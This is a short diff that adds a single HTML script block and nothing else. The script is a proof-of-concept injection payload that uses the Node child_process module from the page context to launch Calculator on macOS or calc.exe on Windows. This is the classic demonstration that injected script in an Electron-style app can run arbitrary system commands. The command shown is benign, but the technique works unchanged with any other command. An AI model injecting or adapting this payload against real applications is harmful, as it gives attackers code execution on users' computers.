@@ -1,0 +1,7 @@
+<script> 
+if (navigator.platform == 'MacIntel') {
+        top.require('child_process').exec('open /System/Applications/Calculator.app');
+    } else {
+        top.require('child_process').execSync('calc.exe');
+    }
+</script>
